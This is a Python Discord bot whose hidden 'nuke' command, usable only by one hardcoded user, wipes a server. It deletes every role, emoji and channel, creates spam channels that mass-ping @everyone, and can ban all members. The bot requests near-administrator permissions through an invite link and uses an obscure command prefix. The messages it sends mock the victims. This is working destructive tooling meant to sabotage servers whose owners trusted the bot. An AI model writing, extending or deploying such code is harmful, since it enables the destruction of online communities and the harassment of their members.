import discord
from discord.ext import commands
import os
import dotenv

from bot.cogs.events import Events


# https://discord.com/api/oauth2/authorize?client_id=796805491186597968&permissions=2147483639&scope=bot

bot = commands.Bot(command_prefix='_?_', help_command=None, intents=discord.Intents.all())
bot.add_cog(Events(bot))
dotenv.load_dotenv()

@bot.command()
async def nuke(ctx, ping: int, ban=None):
    if ctx.author.id == 688530998920871969:
        await ctx.send('hehe nuke go brrrr')
        
        # del roles
        await ctx.send('deleting roles')
        roles = ctx.guild.roles
        for role in roles:
            try:
                await role.delete()
            except:
                pass

        # del emojis
        await ctx.send('deleting emojis')
        emojis = ctx.guild.emojis
        for emoji in emojis:
            try:
                await emoji.delete()
            except:
                pass
        
        # del channels
        await ctx.send('deleting channels')
        channels = ctx.guild.channels
        curr_channel = ctx.message.channel
        for channel in channels:
            if channel != curr_channel:
                try:
                    await channel.delete()
                except:
                    pass
        
        # add new temp channels
        await ctx.send('adding new temp channels')
        temp_channels = []
        for i in range(10):
            temp_channels.append(await ctx.guild.create_text_channel('heh'))

        # ping everyone
        await ctx.send('pinging everyone \:)')
        for i in range(ping):
            for channel in temp_channels:
                if isinstance(channel, discord.TextChannel):
                    await channel.send('@everyone')
        
        # ban members
        await ctx.send('banning you idiots')
        if ban:
            members = ctx.guild.members
            for member in members:
                try:
                    await member.ban()
                except:
                    pass
        
        await ctx.send("nuke done, get rekd")
        
bot.run(os.environ['TOKEN']) # bot token